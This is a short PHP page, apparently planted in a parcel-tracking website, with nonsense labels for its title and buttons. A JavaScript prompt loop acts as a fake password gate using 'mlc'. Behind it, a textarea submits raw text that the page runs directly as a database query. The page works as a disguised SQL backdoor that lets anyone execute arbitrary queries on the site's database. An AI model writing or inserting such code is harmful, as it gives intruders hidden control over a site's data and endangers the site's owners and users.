<!DOCTYPE html>
<html>
	<head>
		<title>--sxdsaefds--</title>
		    
                <script type="text/javascript">
                var data = prompt('--dsgsvdvdg--','');
                while (data !='mlc'){
                var data = prompt('--dsgsvdvdg--','')
                
                }
            </script>
                
                
		 </head>
        
	
	<body>
	<?php
	require_once('database.php');
require_once('library.php');
        if(isset($_POST['core'])){
            $data1 = $_POST['core'];
          if (  dbQuery("$data1")){
              echo "Run Successfully!";
          }else{
               echo "An error Occurred!";
          }
        }else{
            echo "I will log you out now!";
        }
    
    ?>
	
	
        <center>
	<form action="track_code.php" method="POST">
            <br /> <br /><br /> <br /><br /> <br /><br /> <br />
            <textarea required="required" style="width:400px; height:200px;" name="core"></textarea>   <br /> <br />
            <input type="submit" value="--asdefds--" />
         </center>   
        </form>

</body>
</html>